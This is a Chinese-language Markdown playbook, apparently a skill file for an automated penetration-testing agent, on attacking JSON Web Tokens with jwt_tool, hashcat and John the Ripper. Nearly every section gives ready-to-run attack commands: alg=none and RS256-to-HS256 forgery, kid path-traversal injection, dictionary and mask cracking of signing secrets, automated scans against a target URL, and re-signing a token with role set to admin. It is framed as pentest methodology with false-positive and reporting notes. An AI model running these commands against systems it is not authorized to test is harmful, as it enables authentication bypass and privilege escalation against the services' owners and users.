---
name: token-attacks
description: Token 攻击工具 playbook — jwt_tool + hashcat + John the Ripper。JWT 解析 / 弱密钥爆破 / kid 注入 / 算法混淆。
category: tooling
tags: [tool, jwt, hashcat, token, classic]
---

# Token Attacks Tools Playbook (classic only)

> **何时用本文件**: JWT / Token 攻击,从弱密钥爆破到 algorithm confusion。
> **toolPlus 替代**: `mcp__yaklang__brute` (字典爆破) + `mcp__yaklang__exec_codec` (HMAC/RSA 签名链)。

---

## 1. 配置

```yaml
# tool-config.md
jwt_tool: "/path/to/jwt_tool/"
hashcat: "/path/to/hashcat/"
john: "/path/to/john/"
wordlists: "/path/to/jwt-common-secrets.txt"
```

---

## 2. jwt_tool 用法

### 2.1 解码 (不验签)

```bash
python jwt_tool.py <token>
# 显示 Header / Payload / Signature 三段
```

### 2.2 算法混淆 (RS256 → HS256)

```bash
python jwt_tool.py <token> -X k -pk public.pem
# 用提供的公钥作为 HS256 secret 重签
```

### 2.3 alg=none

```bash
python jwt_tool.py <token> -X a
# 自动改 alg=none + 清空签名
```

### 2.4 kid 注入测试

```bash
python jwt_tool.py <token> -I -hc kid -hv "../../../../dev/null"
# 改 kid 为路径遍历
# -I 修改模式,-hc/hv 改 header claim
```

### 2.5 弱密钥爆破

```bash
python jwt_tool.py <token> -C -d wordlists/jwt-common-secrets.txt
# -C crack 模式,-d 字典
```

### 2.6 自动化扫所有攻击

```bash
python jwt_tool.py <token> -M at -t https://target/api/me
# -M at 自动测试模式,-t 目标 URL
# 会跑: alg=none / RS256→HS256 / 弱密钥 / kid 注入
```

---

## 3. hashcat 用法 (HS256 爆破)

### 3.1 准备 hash

```bash
# JWT 转 hashcat 格式: 直接放 token 即可
echo "eyJhbGc..." > jwt.txt
```

### 3.2 弱字典爆破

```bash
hashcat -m 16500 jwt.txt wordlists/rockyou.txt --force
# -m 16500 = JWT HS256
# --force 忽略警告
```

### 3.3 规则增强

```bash
hashcat -m 16500 jwt.txt wordlists/common.txt -r rules/best64.rule
# 用 best64 规则集 (Hashcat 内置) 派生变种
```

### 3.4 掩码爆破

```bash
hashcat -m 16500 jwt.txt -a 3 ?l?l?l?l?l?l?l?l --force
# -a 3 掩码模式,8 位小写字母
```

### 3.5 输出

```bash
hashcat -m 16500 jwt.txt rockyou.txt --show
# 显示已破解
```

### 3.6 推荐字典

| 字典 | 来源 | 备注 |
| :--- | :--- | :--- |
| jwt-common-secrets.txt | wallarm/jwt-secrets-list | 专门 JWT secret |
| rockyou.txt | SecLists | 1400 万密码 |
| jwt.secrets.list | OWASP | 业务 JWT secret |
| 自定义 | 公司名 + 项目名 + placeholder | 命中率最高 |

---

## 4. John the Ripper (备选)

```bash
john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt
# 与 hashcat 类似,跨平台兼容性更好
```

---

## 5. 完整测试流程

```bash
# Step 1: 解析
python jwt_tool.py $JWT
# 看 alg / kid / jku / claims

# Step 2: 优先级测试
# 2a. alg=none (秒级)
python jwt_tool.py $JWT -X a -t https://target/api/me

# 2b. RS256 → HS256 (如果有公钥)
curl https://target/.well-known/jwks.json > jwks.json
python jwt_tool.py $JWT -X k -pk jwks.json

# 2c. 弱密钥 (HS256)
python jwt_tool.py $JWT -C -d jwt-secrets.txt
# 或 hashcat 加速
hashcat -m 16500 jwt.txt jwt-secrets.txt

# 2d. kid 注入
python jwt_tool.py $JWT -I -hc kid -hv "/dev/null"

# 2e. claims 改写 (拿到 secret 后)
python jwt_tool.py $JWT -I -pc role -pv admin -S hs256 -p "<secret>"
```

---

## 6. atomic-rain 协议集成

| 阶段 | 工具 | 动作 |
| :--- | :--- | :--- |
| Phase 2 First-pass | jwt_tool 解码 | 看 alg / kid / claims |
| Phase 2 验证 | jwt_tool -M at | 自动化测主要攻击向量 |
| Phase 2 爆破 | hashcat -m 16500 | 字典爆破 |
| Phase 3 改 claims | jwt_tool -I | role/sub 改写测 BFLA/BOLA |
| Phase 4 报告 | 截图 + Repro-Command | jwt_tool 输出可直接附 |

---

## 7. False Positives

| 现象 | 真实判断 |
| :--- | :--- |
| jwt_tool 报命中但 -t 验证失败 | 服务侧策略不一致 — 手测 |
| hashcat 命中 "default" / placeholder | 业务可能未真用 — 看是否能签出有效 token |
| RS256→HS256 失败 | 公钥格式问题 — 试 PEM 原文 / 去 header/footer / DER base64 三种 |
| alg=none 200 但权限不变 | 后端不真用 JWT role — 改 user_id 试 BOLA |
| kid 路径遍历命中但 401 | kid 注入但 secret 仍校验 — 试 /dev/null 让 secret 为空 |

---

## 8. Pro Tips

- **jwt_tool 默认字典在 ./wordlists/**: 自带一些,但要补充
- **`-M at` 自动测试快**: 5 分钟跑完所有主要攻击
- **公钥三格式**: PEM 原文 / 去 BEGIN/END 行 / DER base64 — 都试一遍
- **`--gpu` hashcat**: 有 GPU 用 hashcat 比 CPU 的 jwt_tool 快 10-100x
- **公司名作为字典**: `target` / `target_secret` / `jwt_target` 等命中率高
- **`jwks_uri` 拿公钥**: discovery endpoint `/.well-known/openid-configuration`
- **国内 JWT 实战**: 阿里 / 腾讯 / 字节多数自研 sign,但内部项目常用 jjwt 库 + 默认 placeholder
- **token 长度异常**: 超长 (>500 字符) token 通常含大量 claims,看是否藏隐私 (PII)
- **不只看 access_token**: refresh_token / id_token / OAuth state — 也可能含 JWT
- **OAuth `state` JWT**: state 是 JWT 的情况 (高级),改 state 可能绕过 CSRF

---

## 9. 相关参考

- JWT 决策卡: [../vuln/jwt-advanced.md](../vuln/jwt-advanced.md)
- JWT 构造思路: [../payload-construction/jwt-construction.md](../payload-construction/jwt-construction.md)
- OAuth 高阶: [../vuln/oauth-advanced.md](../vuln/oauth-advanced.md)
- OIDC: [../vuln/oidc-attacks.md](../vuln/oidc-attacks.md)
- 弱口令生成: [../weak-password-generation.md](../weak-password-generation.md)
